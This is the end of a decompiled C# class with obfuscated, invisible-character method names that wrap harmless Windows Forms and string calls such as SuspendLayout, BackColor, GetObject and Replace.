    static void \u200F⁭⁪‍‌‫‏⁬‪⁪⁯‏⁬‎⁪⁬⁫‬‍‭‌⁪‫‮‬‮⁯⁫‎‫⁭⁯‭⁭‫‌‍‫‭‍‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u206A‌‪‏⁭‭⁫⁮⁫⁫⁪‭‮‫⁮⁭⁭‬‍‌⁪​‍⁪⁯⁭⁫‎⁮⁫‏‍‬⁫⁫‌‬‍‫‍‮([In] Control obj0, [In] bool obj1) => obj0.AutoSize = obj1;

    static object \u200B‏⁪‬⁪⁮‮‮‭⁪⁯⁫‬‮⁪​⁬‬‫⁭⁫⁫‌⁭‬⁬⁪​⁮‌‍‭‭‭​‎⁪‍⁭‎‮([In] ResourceManager obj0, [In] string obj1) => obj0.GetObject(obj1);

    static void \u200E​⁫⁪‪‮⁯‍‪‭‪‍‎⁮⁬‌‍⁬⁬⁬⁪⁭‭⁪‍⁯‪⁬⁫⁮⁪⁬‬​‮⁯​‎⁮‬‮([In] PictureBox obj0, [In] Image obj1) => obj0.Image = obj1;

    static Color \u206B⁭​‫⁯‬‍⁬‏‎‭‎‎‫‪⁯‎​⁫⁪‌‌‭​⁮‬‪⁬‎‬‏‏‬⁬‍⁫⁫⁪‪⁭‮() => SystemColors.ControlLight;

    static void \u200F⁪⁫⁭‪⁫​‪⁯‪​‬⁫‌‮‍⁬‮‮⁭‪‬⁪‪‍‍‮‫⁫⁯⁯‬‏‭⁯‬‎‪⁮⁮‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static string \u200B⁯⁯‪‮‍⁮‎⁮‮‮‏⁬⁭‌⁯‬‏⁫‮‪⁪‮‍‎‬‎‍‌‭⁭‌‪‬‫⁯‎‎‏‫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202E‏‌‪⁭‫⁪​​⁭⁯‎⁬‌‏⁪⁭⁬​⁪‎⁮‏⁭‬‮‫⁯‎‏‎‌‫‍⁬‏⁮⁮‪‎‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0.Replace(obj1, obj2);
    }
  }
}
